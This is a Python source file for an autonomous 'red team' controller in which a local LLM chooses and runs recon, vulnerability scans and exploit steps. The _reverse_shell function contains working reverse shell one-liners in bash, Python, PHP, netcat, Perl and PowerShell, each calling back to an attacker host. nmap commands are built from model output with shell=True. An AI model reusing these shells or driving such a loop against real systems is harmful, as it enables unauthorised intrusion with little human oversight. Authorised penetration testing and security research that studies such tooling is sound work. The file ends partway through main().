"""
RedTeam AI Controller — Ollama Edition
=======================================
Integrates your local Ollama model (llama3.1:8b or any model) as the AI brain
that drives the entire red team MCP toolchain.

Architecture:
  User Input
      │
      ▼
  OllamaController  ──► decides action via LLM reasoning
      │
      ▼
  ToolDispatcher    ──► routes to the correct tool/workflow
      │
      ▼
  Tool Execution    ──► recon / vuln / exploit / reporting
      │
      ▼
  ResultAnalyzer    ──► feeds output back into LLM for next decision
      │
      ▼
  Loop until goal complete or user exits

Usage:
    python ai_controller.py
    python ai_controller.py --model llama3.1:8b --target 192.168.1.10
    python ai_controller.py --auto "run full recon on 10.0.0.5"
"""

import requests
import json
import subprocess
import socket
import argparse
import sys
import os
import time
import httpx
from datetime import datetime
from typing import Optional

# ── Configuration ──────────────────────────────────────────────────────────────

OLLAMA_URL     = "http://127.0.0.1:11434/api/generate"
OLLAMA_CHAT_URL = "http://127.0.0.1:11434/api/chat"
DEFAULT_MODEL  = "llama3.1:8b"
REPORTS_DIR    = os.path.join(os.path.dirname(__file__), "reports")

# ── ANSI Colors ────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def banner():
    print(f"""
{C.RED}{C.BOLD}
 ██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗
 ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
 ██████╔╝█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║
 ██╔══██╗██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
 ██║  ██║███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
 ╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
{C.RESET}
{C.CYAN}        AI-Powered Red Team Controller — Ollama Edition{C.RESET}
{C.DIM}        Authorized penetration testing use only{C.RESET}
""")

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log_info(msg):
    print(f"{C.DIM}[{ts()}]{C.RESET} {C.CYAN}[*]{C.RESET} {msg}")

def log_success(msg):
    print(f"{C.DIM}[{ts()}]{C.RESET} {C.GREEN}[+]{C.RESET} {msg}")

def log_warn(msg):
    print(f"{C.DIM}[{ts()}]{C.RESET} {C.YELLOW}[!]{C.RESET} {msg}")

def log_error(msg):
    print(f"{C.DIM}[{ts()}]{C.RESET} {C.RED}[-]{C.RESET} {msg}")

def log_ai(msg):
    print(f"{C.DIM}[{ts()}]{C.RESET} {C.BLUE}[AI]{C.RESET} {msg}")

def log_finding(severity, title):
    colors = {"Critical": C.RED, "High": C.YELLOW, "Medium": C.CYAN, "Low": C.WHITE}
    c = colors.get(severity, C.WHITE)
    print(f"{C.DIM}[{ts()}]{C.RESET} {c}[FINDING — {severity.upper()}]{C.RESET} {title}")

# ── System Prompt ──────────────────────────────────────────────────────────────

SYSTEM_PROMPT = """You are an autonomous red team AI controller operating inside an authorized penetration test.

Your job is to analyze the user's request or the output of a previous tool, then decide the best next action.

You MUST respond ONLY with valid JSON. No markdown, no explanation, no prose. Raw JSON only.

=== AVAILABLE ACTIONS ===

RECON:
  {"action": "nmap_scan",       "target": "IP",    "ports": "1-1000",   "flags": "-sV"}
  {"action": "dns_recon",       "target": "domain"}
  {"action": "whois",           "target": "domain or IP"}
  {"action": "subdomain_enum",  "target": "domain", "wordlist": null}
  {"action": "banner_grab",     "target": "IP",     "port": 80}

VULN SCANNING:
  {"action": "nikto_scan",         "target": "IP or domain", "port": 80, "ssl": false}
  {"action": "http_headers",       "url": "http://target"}
  {"action": "analyze_service",    "service": "Apache httpd", "version": "2.4.49"}
  {"action": "nmap_vuln_scripts",  "target": "IP", "ports": "80,443,22"}

EXPLOIT RESEARCH:
  {"action": "searchsploit",       "query": "vsftpd 2.3.4"}
  {"action": "reverse_shell",      "lhost": "10.0.0.1", "lport": 4444, "type": "bash"}
  {"action": "encode_payload",     "payload": "...", "encoding": "base64"}
  {"action": "msf_search",         "query": "eternalblue"}

REPORTING:
  {"action": "log_finding",    "title": "...", "severity": "Critical|High|Medium|Low|Informational",
   "target": "...", "description": "...", "evidence": "...", "recommendation": "..."}
  {"action": "generate_report", "client": "...", "tester": "...", "scope": "..."}

ORCHESTRATION (multi-tool workflows):
  {"action": "full_recon",         "target": "IP or domain"}
  {"action": "web_assessment",     "url": "http://target"}
  {"action": "network_assessment", "target": "IP", "ports": "1-65535"}
  {"action": "quick_triage",       "target": "IP"}

CONTROL:
  {"action": "ask_user",    "question": "Ask the operator a clarifying question"}
  {"action": "summarize",   "message": "Provide a summary or conclusion to the user"}
  {"action": "done",        "message": "Engagement complete — explain what was found"}

=== RULES ===
1. Always start with reconnaissance before exploitation
2. Never assume a target is in scope — if unsure, use ask_user
3. After a scan, analyze output and log important findings with log_finding
4. Chain actions logically: recon → vuln scan → exploit research → report
5. Return ONE action per response
6. When you have enough info, use summarize or done

Respond with JSON only. No markdown. No explanation.
"""

# ── Ollama Client ──────────────────────────────────────────────────────────────

class OllamaClient:
    def __init__(self, model: str = DEFAULT_MODEL, url: str = OLLAMA_URL):
        self.model = model
        self.url = url
        self.chat_url = OLLAMA_CHAT_URL
        self.conversation_history = []

    def check_connection(self) -> bool:
        """Verify Ollama is running and the model is available."""
        try:
            r = requests.get("http://127.0.0.1:11434/api/tags", timeout=3)
            if r.status_code == 200:
                models = [m["name"] for m in r.json().get("models", [])]
                if any(self.model.split(":")[0] in m for m in models):
                    log_success(f"Ollama connected — model: {self.model}")
                    return True
                else:
                    log_warn(f"Model '{self.model}' not found. Available: {models}")
                    log_warn(f"Pull it with: ollama pull {self.model}")
                    return False
        except requests.exceptions.ConnectionError:
            log_error("Cannot connect to Ollama at http://127.0.0.1:11434")
            log_error("Start it with: ollama serve")
            return False
        except Exception as e:
            log_error(f"Ollama check failed: {e}")
            return False

    def query(self, user_message: str, context: str = "") -> str:
        """
        Query the LLM with the system prompt + optional context + user message.
        Uses /api/generate for single-turn with injected context.
        """
        prompt = SYSTEM_PROMPT
        if context:
            prompt += f"\n\n=== PREVIOUS TOOL OUTPUT ===\n{context[:3000]}\n=== END OUTPUT ===\n"
        prompt += f"\n\nOperator request / context: {user_message}"

        payload = {
            "model": self.model,
            "prompt": prompt,
            "stream": False,
            "options": {
                "temperature": 0.1,       # Low temp for consistent JSON
                "top_p": 0.9,
                "num_predict": 512,
            }
        }

        try:
            r = requests.post(self.url, json=payload, timeout=120)
            r.raise_for_status()
            raw = r.json().get("response", "").strip()
            return raw
        except requests.exceptions.Timeout:
            log_error("Ollama request timed out after 120s")
            return '{"action": "ask_user", "question": "LLM timed out. Please retry."}'
        except Exception as e:
            log_error(f"Ollama request failed: {e}")
            return '{"action": "ask_user", "question": "LLM error. Please retry."}'

    def parse_json_response(self, raw: str) -> Optional[dict]:
        """
        Robustly parse JSON from LLM response.
        Handles markdown fences, leading text, and partial responses.
        """
        # Strip markdown fences
        cleaned = raw.strip()
        if "```json" in cleaned:
            cleaned = cleaned.split("```json")[1].split("```")[0].strip()
        elif "```" in cleaned:
            cleaned = cleaned.split("```")[1].split("```")[0].strip()

        # Try direct parse
        try:
            return json.loads(cleaned)
        except json.JSONDecodeError:
            pass

        # Try to find JSON object within text
        start = cleaned.find("{")
        end = cleaned.rfind("}") + 1
        if start != -1 and end > start:
            try:
                return json.loads(cleaned[start:end])
            except json.JSONDecodeError:
                pass

        log_warn(f"Could not parse JSON from LLM response:\n{raw[:300]}")
        return None


# ── Tool Dispatcher ────────────────────────────────────────────────────────────

class ToolDispatcher:
    """Executes tool actions and returns string output for LLM feedback."""

    def __init__(self):
        self.findings = []
        self.engagement_meta = {}
        self.session_log = []

    def _log(self, entry: str):
        self.session_log.append(f"[{ts()}] {entry}")

    def dispatch(self, action_data: dict) -> str:
        action = action_data.get("action", "").lower()

        dispatch_map = {
            # Recon
            "nmap_scan":         self._nmap_scan,
            "dns_recon":         self._dns_recon,
            "whois":             self._whois,
            "subdomain_enum":    self._subdomain_enum,
            "banner_grab":       self._banner_grab,
            # Vuln
            "nikto_scan":        self._nikto_scan,
            "http_headers":      self._http_headers,
            "analyze_service":   self._analyze_service,
            "nmap_vuln_scripts": self._nmap_vuln_scripts,
            # Exploit
            "searchsploit":      self._searchsploit,
            "reverse_shell":     self._reverse_shell,
            "encode_payload":    self._encode_payload,
            "msf_search":        self._msf_search,
            # Reporting
            "log_finding":       self._log_finding,
            "generate_report":   self._generate_report,
            # Workflows
            "full_recon":        self._full_recon,
            "web_assessment":    self._web_assessment,
            "network_assessment":self._network_assessment,
            "quick_triage":      self._quick_triage,
        }

        handler = dispatch_map.get(action)
        if not handler:
            return f"Unknown action '{action}'. Check available actions in the system prompt."

        self._log(f"Dispatching: {action} | args: {json.dumps({k:v for k,v in action_data.items() if k != 'action'})}")
        return handler(action_data)

    # ── Recon tools ─────────────────────────────────────────────────────────

    def _nmap_scan(self, d: dict) -> str:
        target = d.get("target", "")
        ports  = d.get("ports", "1-1000")
        flags  = d.get("flags", "-sV")
        log_info(f"nmap {flags} -p {ports} {target}")
        try:
            cmd = f"nmap {flags} -p {ports} --open {target}"
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            output = r.stdout or r.stderr
            log_success(f"nmap complete ({len(output)} bytes)")
            return output
        except subprocess.TimeoutExpired:
            return "nmap timed out after 120s"
        except Exception as e:
            return f"nmap error: {e}"

    def _dns_recon(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"DNS recon: {target}")
        results = {}
        for rtype in ["A", "MX", "NS", "TXT", "AAAA"]:
            try:
                r = subprocess.run(["dig", "+short", rtype, target],
                                   capture_output=True, text=True, timeout=8)
                if r.stdout.strip():
                    results[rtype] = r.stdout.strip().splitlines()
            except Exception as e:
                results[rtype] = [f"error: {e}"]
        log_success(f"DNS recon done — {len(results)} record types")
        return json.dumps(results, indent=2)

    def _whois(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"WHOIS: {target}")
        try:
            r = subprocess.run(["whois", target], capture_output=True, text=True, timeout=15)
            return r.stdout[:3000]
        except Exception as e:
            return f"whois error: {e}"

    def _subdomain_enum(self, d: dict) -> str:
        target   = d.get("target", "")
        wordlist = d.get("wordlist")
        log_info(f"Subdomain enum: {target}")

        default_subs = [
            "www","mail","ftp","admin","dev","staging","api","vpn","remote",
            "test","portal","shop","blog","secure","mx","ns1","ns2","smtp",
            "pop","imap","webmail","jenkins","gitlab","jira","confluence",
            "dashboard","app","auth","login","cdn","static","beta","prod",
        ]
        subs = default_subs
        if wordlist:
            try:
                with open(wordlist) as f:
                    subs = [l.strip() for l in f if l.strip()]
            except Exception as e:
                log_warn(f"Could not open wordlist: {e} — using defaults")

        found = []
        for sub in subs:
            fqdn = f"{sub}.{target}"
            try:
                ip = socket.gethostbyname(fqdn)
                found.append({"subdomain": fqdn, "ip": ip})
            except socket.gaierror:
                pass

        log_success(f"Subdomain enum done — {len(found)}/{len(subs)} resolved")
        return json.dumps({"domain": target, "found": found}, indent=2)

    def _banner_grab(self, d: dict) -> str:
        host    = d.get("target", "")
        port    = int(d.get("port", 80))
        timeout = int(d.get("timeout", 5))
        log_info(f"Banner grab: {host}:{port}")
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = s.recv(512).decode("utf-8", errors="replace")
            log_success(f"Banner captured ({len(banner)} bytes)")
            return banner
        except Exception as e:
            return f"Banner grab failed: {e}"

    # ── Vuln tools ──────────────────────────────────────────────────────────

    def _nikto_scan(self, d: dict) -> str:
        target = d.get("target", "")
        port   = int(d.get("port", 80))
        ssl    = d.get("ssl", False)
        log_info(f"Nikto scan: {target}:{port}")
        cmd = ["nikto", "-h", target, "-p", str(port), "-Format", "txt", "-maxtime", "120"]
        if ssl:
            cmd.append("-ssl")
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=150)
            log_success(f"Nikto done ({len(r.stdout)} bytes)")
            return r.stdout or "No output from nikto"
        except FileNotFoundError:
            return "nikto not installed. Run: apt install nikto"
        except subprocess.TimeoutExpired:
            return "nikto timed out"
        except Exception as e:
            return f"nikto error: {e}"

    def _http_headers(self, d: dict) -> str:
        url = d.get("url", "")
        log_info(f"HTTP header analysis: {url}")
        security_headers = [
            "Strict-Transport-Security", "Content-Security-Policy",
            "X-Frame-Options", "X-Content-Type-Options",
            "Referrer-Policy", "Permissions-Policy",
        ]
        try:
            resp = httpx.get(url, timeout=10, follow_redirects=True, verify=False)
            headers = dict(resp.headers)
            missing = [h for h in security_headers if h.lower() not in {k.lower() for k in headers}]
            result = {
                "status_code": resp.status_code,
                "server": headers.get("server", "not disclosed"),
                "x_powered_by": headers.get("x-powered-by", "not disclosed"),
                "missing_security_headers": missing,
                "all_headers": {k: v for k, v in headers.items()},
            }
            log_success(f"Headers checked — {len(missing)} missing security headers")
            return json.dumps(result, indent=2)
        except Exception as e:
            return f"HTTP header check failed: {e}"

    def _analyze_service(self, d: dict) -> str:
        service = d.get("service", "")
        version = d.get("version", "")
        log_info(f"Analyzing: {service} {version}")
        known = {
            ("apache", "2.4.49"): ["CVE-2021-41773 — Path Traversal/RCE (CRITICAL)"],
            ("apache", "2.4.50"): ["CVE-2021-42013 — Path Traversal (CRITICAL)"],
            ("openssh", "7.4"):   ["CVE-2016-6210 — User Enumeration (MEDIUM)"],
            ("vsftpd", "2.3.4"):  ["CVE-2011-2523 — Backdoor RCE (CRITICAL)"],
            ("samba", "3.5"):     ["CVE-2017-7494 — SambaCry EternalRed (CRITICAL)"],
            ("log4j", "2.14"):    ["CVE-2021-44228 — Log4Shell RCE (CRITICAL)"],
            ("openssl", "1.0.1"): ["CVE-2014-0160 — Heartbleed (HIGH)"],
            ("struts", "2.5."):   ["CVE-2017-5638 — RCE via Content-Type (CRITICAL)"],
            ("drupal", "7."):     ["CVE-2018-7600 — Drupalgeddon2 RCE (CRITICAL)"],
            ("iis", "6.0"):       ["CVE-2017-7269 — Buffer Overflow RCE (CRITICAL)"],
        }
        hits = []
        for (db_s, db_v), cves in known.items():
            if db_s in service.lower() and (not db_v or db_v in version.lower()):
                hits.extend(cves)

        result = {
            "service": service,
            "version": version,
            "known_cves": hits,
            "nvd_url": f"https://nvd.nist.gov/vuln/search/results?query={service}+{version}",
        }
        log_success(f"Analysis done — {len(hits)} CVE matches")
        return json.dumps(result, indent=2)

    def _nmap_vuln_scripts(self, d: dict) -> str:
        target = d.get("target", "")
        ports  = d.get("ports", "80,443,22")
        log_info(f"nmap vuln scripts: {target} ports {ports}")
        try:
            r = subprocess.run(
                ["nmap", "-sV", "--script", "vuln", "-p", ports, target],
                capture_output=True, text=True, timeout=300
            )
            log_success("Vuln scripts complete")
            return r.stdout
        except FileNotFoundError:
            return "nmap not installed"
        except subprocess.TimeoutExpired:
            return "nmap vuln scripts timed out"
        except Exception as e:
            return f"error: {e}"

    # ── Exploit tools ────────────────────────────────────────────────────────

    def _searchsploit(self, d: dict) -> str:
        query = d.get("query", "")
        log_info(f"searchsploit: {query}")
        try:
            r = subprocess.run(
                ["searchsploit", "--json"] + query.split(),
                capture_output=True, text=True, timeout=20
            )
            data = json.loads(r.stdout)
            exploits = data.get("RESULTS_EXPLOIT", [])[:10]
            log_success(f"searchsploit: {len(exploits)} results")
            return json.dumps({"query": query, "count": len(exploits), "exploits": exploits}, indent=2)
        except FileNotFoundError:
            return f"searchsploit not installed. Online: https://www.exploit-db.com/search?q={query}"
        except json.JSONDecodeError:
            return "searchsploit returned non-JSON output"
        except Exception as e:
            return f"searchsploit error: {e}"

    def _reverse_shell(self, d: dict) -> str:
        import base64, urllib.parse
        lhost     = d.get("lhost", "")
        lport     = int(d.get("lport", 4444))
        shell_type = d.get("type", "bash")
        log_info(f"Generating {shell_type} reverse shell → {lhost}:{lport}")

        shells = {
            "bash":       f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python3":    f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "php":        f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc":         f"nc -e /bin/sh {lhost} {lport}",
            "nc_mkfifo":  f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "perl":       f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport})",
        }

        if shell_type not in shells:
            return f"Unknown shell type '{shell_type}'. Options: {', '.join(shells.keys())}"

        cmd = shells[shell_type]
        b64 = base64.b64encode(cmd.encode()).decode()
        log_success(f"Reverse shell generated ({shell_type})")
        return json.dumps({
            "shell_type": shell_type,
            "command": cmd,
            "base64": b64,
            "listener": f"nc -lvnp {lport}",
            "rlwrap_listener": f"rlwrap nc -lvnp {lport}",
        }, indent=2)

    def _encode_payload(self, d: dict) -> str:
        import base64, urllib.parse
        payload  = d.get("payload", "")
        encoding = d.get("encoding", "base64")
        if encoding == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            encoded = urllib.parse.quote(payload)
        elif encoding == "hex":
            encoded = payload.encode().hex()
        else:
            return f"Unknown encoding '{encoding}'"
        log_success(f"Payload encoded ({encoding})")
        return json.dumps({"original": payload, "encoding": encoding, "encoded": encoded}, indent=2)

    def _msf_search(self, d: dict) -> str:
        query = d.get("query", "")
        log_info(f"msfconsole search: {query}")
        try:
            r = subprocess.run(
                ["msfconsole", "-q", "-x", f"search {query}; exit"],
                capture_output=True, text=True, timeout=60
            )
            log_success("MSF search complete")
            return r.stdout
        except FileNotFoundError:
            return f"msfconsole not found. Online: https://www.rapid7.com/db/?q={query}&type=metasploit"
        except Exception as e:
            return f"msfconsole error: {e}"

    # ── Reporting ────────────────────────────────────────────────────────────

    def _log_finding(self, d: dict) -> str:
        finding = {
            "id":             f"FIND-{len(self.findings)+1:03d}",
            "title":          d.get("title", "Untitled Finding"),
            "severity":       d.get("severity", "Informational"),
            "target":         d.get("target", "N/A"),
            "description":    d.get("description", ""),
            "evidence":       d.get("evidence", ""),
            "recommendation": d.get("recommendation", ""),
            "cve":            d.get("cve"),
            "cvss_score":     d.get("cvss_score"),
            "logged_at":      datetime.now().isoformat(),
        }
        self.findings.append(finding)
        log_finding(finding["severity"], finding["title"])
        return f"Finding logged: {finding['id']} — [{finding['severity']}] {finding['title']}"

    def _generate_report(self, d: dict) -> str:
        client  = d.get("client", "Unknown Client")
        tester  = d.get("tester", "Red Team Operator")
        scope   = d.get("scope", "As discussed")
        fmt     = d.get("format", "markdown")

        os.makedirs(REPORTS_DIR, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_client = client.replace(" ", "_")

        severity_order = ["Critical", "High", "Medium", "Low", "Informational"]
        counts = {s: len([f for f in self.findings if f.get("severity") == s]) for s in severity_order}

        if counts["Critical"] > 0:
            risk = "CRITICAL"
        elif counts["High"] > 0:
            risk = "HIGH"
        elif counts["Medium"] > 0:
            risk = "MEDIUM"
        elif counts["Low"] > 0:
            risk = "LOW"
        else:
            risk = "INFORMATIONAL"

        log_info(f"Generating {fmt} report for {client} — {len(self.findings)} findings")

        if fmt == "json":
            data = {"client": client, "tester": tester, "scope": scope,
                    "overall_risk": risk, "counts": counts,
                    "findings": self.findings,
                    "generated_at": datetime.now().isoformat()}
            fname = f"{safe_client}_report_{timestamp}.json"
            fpath = os.path.join(REPORTS_DIR, fname)
            with open(fpath, "w") as f:
                json.dump(data, f, indent=2)
            log_success(f"JSON report saved: {fpath}")
            return f"Report saved to: {fpath}"

        icons = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🔵", "Informational": "⚪"}
        lines = [
            "# Penetration Test Report",
            f"**CONFIDENTIAL — {client.upper()}**\n",
            "---\n",
            "## Engagement Details\n",
            "| Field | Value |",
            "|-------|-------|",
            f"| **Client** | {client} |",
            f"| **Lead Tester** | {tester} |",
            f"| **Scope** | {scope} |",
            f"| **Report Date** | {datetime.now().strftime('%Y-%m-%d')} |",
            f"| **Overall Risk** | **{risk}** |\n",
            "---\n",
            "## Executive Summary\n",
            f"This assessment identified **{len(self.findings)} finding(s)** with overall risk rating of **{risk}**.\n",
            "| Severity | Count |",
            "|----------|-------|",
        ]
        for s in severity_order:
            lines.append(f"| {icons[s]} {s} | {counts[s]} |")

        lines += ["\n---\n", "## Findings\n"]
        if not self.findings:
            lines.append("*No findings were logged.*\n")
        else:
            for sev in severity_order:
                sev_f = [f for f in self.findings if f.get("severity") == sev]
                if not sev_f:
                    continue
                lines.append(f"\n### {icons[sev]} {sev} Severity\n")
                for f in sev_f:
                    lines += [
                        f"#### {f['id']}: {f['title']}\n",
                        f"**Severity:** {f['severity']}  \n**Target:** `{f['target']}`\n",
                        f"**Description:**\n{f['description']}\n",
                        f"**Evidence:**\n```\n{f['evidence']}\n```\n",
                        f"**Recommendation:**\n{f['recommendation']}\n",
                        "---\n",
                    ]

        lines += [
            "## Disclaimer\n",
            f"Report generated by authorized red team operator. Testing conducted within agreed scope.\n",
            f"*Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Prepared by: {tester}*",
        ]

        content = "\n".join(lines)
        fname = f"{safe_client}_pentest_report_{timestamp}.md"
        fpath = os.path.join(REPORTS_DIR, fname)
        with open(fpath, "w") as f:
            f.write(content)

        log_success(f"Report saved: {fpath}")
        return f"Pentest report saved to: {fpath}\nRisk: {risk} | Findings: {len(self.findings)}"

    # ── Workflow orchestrations ───────────────────────────────────────────────

    def _full_recon(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"WORKFLOW: Full recon on {target}")
        results = {}
        results["whois"]     = self._whois({"target": target})[:1000]
        results["dns"]       = self._dns_recon({"target": target})
        results["subdomains"]= self._subdomain_enum({"target": target})
        results["nmap"]      = self._nmap_scan({"target": target, "ports": "1-1000", "flags": "-sV"})
        log_success("Full recon workflow complete")
        return json.dumps(results, indent=2)[:5000]

    def _web_assessment(self, d: dict) -> str:
        url = d.get("url", "")
        log_info(f"WORKFLOW: Web assessment on {url}")
        from urllib.parse import urlparse
        p = urlparse(url)
        host = p.hostname or url
        port = p.port or (443 if p.scheme == "https" else 80)
        results = {}
        results["headers"] = self._http_headers({"url": url})
        results["nikto"]   = self._nikto_scan({"target": host, "port": port, "ssl": p.scheme == "https"})
        log_success("Web assessment workflow complete")
        return json.dumps(results, indent=2)[:5000]

    def _network_assessment(self, d: dict) -> str:
        target = d.get("target", "")
        ports  = d.get("ports", "1-65535")
        log_info(f"WORKFLOW: Network assessment on {target}")
        results = {}
        results["nmap_sv"]   = self._nmap_scan({"target": target, "ports": ports, "flags": "-sV -sC"})
        results["nmap_vuln"] = self._nmap_vuln_scripts({"target": target, "ports": "22,80,443,445,3389"})
        log_success("Network assessment workflow complete")
        return json.dumps(results, indent=2)[:5000]

    def _quick_triage(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"WORKFLOW: Quick triage on {target}")
        TOP_PORTS = "21,22,23,25,53,80,110,139,143,443,445,993,995,1433,3306,3389,5432,6379,8080,8443"
        nmap_out = self._nmap_scan({"target": target, "ports": TOP_PORTS, "flags": "-sV -T4"})
        log_success("Quick triage complete")
        return nmap_out


# ── Main AI Loop ───────────────────────────────────────────────────────────────

class RedTeamAI:
    def __init__(self, model: str = DEFAULT_MODEL):
        self.llm        = OllamaClient(model=model)
        self.dispatcher = ToolDispatcher()
        self.last_output = ""
        self.step        = 0
        self.max_auto_steps = 15

    def run_interactive(self):
        """Interactive REPL mode — user drives each step."""
        banner()
        print(f"{C.CYAN}Model:{C.RESET} {self.llm.model}")
        print(f"{C.CYAN}Mode:{C.RESET}  Interactive")
        print(f"{C.DIM}Type 'exit' to quit | 'findings' to list findings | 'history' to show session log{C.RESET}\n")

        if not self.llm.check_connection():
            log_error("Exiting — cannot connect to Ollama.")
            sys.exit(1)

        while True:
            try:
                user_input = input(f"\n{C.BOLD}{C.RED}redteam>{C.RESET} ").strip()
            except (KeyboardInterrupt, EOFError):
                print("\n")
                log_info("Session ended.")
                break

            if not user_input:
                continue

            if user_input.lower() in ("exit", "quit"):
                log_info("Session ended.")
                break

            if user_input.lower() == "findings":
                self._print_findings()
                continue

            if user_input.lower() == "history":
                self._print_history()
                continue

            if user_input.lower().startswith("report "):
                # Quick report generation: "report ClientName YourName scope"
                parts = user_input.split(" ", 3)
                client = parts[1] if len(parts) > 1 else "Client"
                tester = parts[2] if len(parts) > 2 else "Tester"
                scope  = parts[3] if len(parts) > 3 else "As authorized"
                result = self.dispatcher._generate_report({"client": client, "tester": tester, "scope": scope})
                print(result)
                continue

            self._ai_step(user_input)

    def run_auto(self, goal: str):
        """Autonomous mode — AI drives the full engagement to completion."""
        banner()
        print(f"{C.CYAN}Model:{C.RESET} {self.llm.model}")
        print(f"{C.CYAN}Mode:{C.RESET}  Autonomous")
        print(f"{C.CYAN}Goal:{C.RESET}  {goal}\n")

        if not self.llm.check_connection():
            log_error("Exiting — cannot connect to Ollama.")
            sys.exit(1)

        context = f"Begin the engagement. Goal: {goal}"

        for step in range(self.max_auto_steps):
            self.step = step + 1
            print(f"\n{C.YELLOW}{'━'*60}{C.RESET}")
            print(f"{C.YELLOW}Step {self.step}/{self.max_auto_steps}{C.RESET}")

            raw = self.llm.query(context, self.last_output)
            log_ai(f"Raw response: {raw[:200]}")

            action_data = self.llm.parse_json_response(raw)
            if not action_data:
                log_warn("Could not parse action — retrying with clarification")
                context = "Your last response was not valid JSON. Return ONLY a JSON action."
                continue

            action = action_data.get("action", "")
            print(f"{C.BOLD}Action:{C.RESET} {action}")

            if action == "ask_user":
                question = action_data.get("question", "")
                print(f"\n{C.YELLOW}[AI asks]{C.RESET} {question}")
                answer = input(f"{C.BOLD}Your answer:{C.RESET} ").strip()
                context = f"Operator answered: {answer}"
                self.last_output = answer
                continue

            if action in ("done", "summarize"):
                msg = action_data.get("message", "")
                print(f"\n{C.GREEN}{'━'*60}")
                print(f"[AI SUMMARY]{C.RESET}")
                print(msg)
                print(f"{C.GREEN}{'━'*60}{C.RESET}")
                self._print_findings()
                break

            output = self.dispatcher.dispatch(action_data)
            self.last_output = output

            # Show truncated output
            preview = output[:600].replace("\n", "\n  ")
            print(f"\n{C.DIM}Output (truncated):{C.RESET}\n  {preview}")
            if len(output) > 600:
                print(f"  {C.DIM}... [{len(output)} total bytes]{C.RESET}")

            context = f"You just ran '{action}'. Here is the output. Decide your next action."

        else:
            log_warn(f"Reached max steps ({self.max_auto_steps}). Stopping autonomous mode.")

        self._print_findings()

    def _ai_step(self, user_input: str):
        """Single AI-driven step from user input."""
        print()
        raw = self.llm.query(user_input, self.last_output)
        log_ai(f"Decided action: {raw[:200]}")

        action_data = self.llm.parse_json_response(raw)
        if not action_data:
            log_error("LLM returned invalid JSON. Try rephrasing your request.")
            print(f"{C.DIM}Raw response:{C.RESET} {raw}")
            return

        action = action_data.get("action", "")
        print(f"{C.BOLD}Action:{C.RESET} {C.CYAN}{action}{C.RESET}")
        if action in ("ask_user", "summarize", "done"):
            msg = action_data.get("question") or action_data.get("message", "")
            print(f"\n{C.BLUE}[AI]{C.RESET} {msg}")
            return

        output = self.dispatcher.dispatch(action_data)
        self.last_output = output

        # Print output
        print(f"\n{C.DIM}{'─'*60}{C.RESET}")
        print(output[:2000])
        if len(output) > 2000:
            print(f"{C.DIM}... [{len(output)} total bytes]{C.RESET}")
        print(f"{C.DIM}{'─'*60}{C.RESET}")

    def _print_findings(self):
        findings = self.dispatcher.findings
        if not findings:
            print(f"\n{C.DIM}No findings logged yet.{C.RESET}")
            return
        print(f"\n{C.BOLD}{'━'*60}")
        print(f"FINDINGS SUMMARY — {len(findings)} total{C.RESET}")
        print(f"{C.BOLD}{'━'*60}{C.RESET}")
        for f in findings:
            colors = {"Critical": C.RED, "High": C.YELLOW, "Medium": C.CYAN, "Low": C.WHITE}
            c = colors.get(f["severity"], C.WHITE)
            print(f"  {c}[{f['severity']:<14}]{C.RESET} {f['id']} — {f['title']}")
            print(f"  {C.DIM}           Target: {f['target']}{C.RESET}")

    def _print_history(self):
        if not self.dispatcher.session_log:
            print(f"{C.DIM}No session history.{C.RESET}")
            return
        print(f"\n{C.DIM}{'─'*50}{C.RESET}")
        for entry in self.dispatcher.session_log[-20:]:
            print(f"  {C.DIM}{entry}{C.RESET}")
        print(f"{C.DIM}{'─'*50}{C.RESET}")


# ── CLI ────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="RedTeam AI Controller — Ollama-powered autonomous pentesting",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ai_controller.py                              # Interactive mode
  python ai_controller.py --model llama3.1:8b          # Interactive with specific model
  python ai_controller.py --auto "recon 192.168.1.10"  # Autonomous mode
  python ai_controller.py --auto "full web test on http://10.0.0.5" --max-steps 20
        """
    )
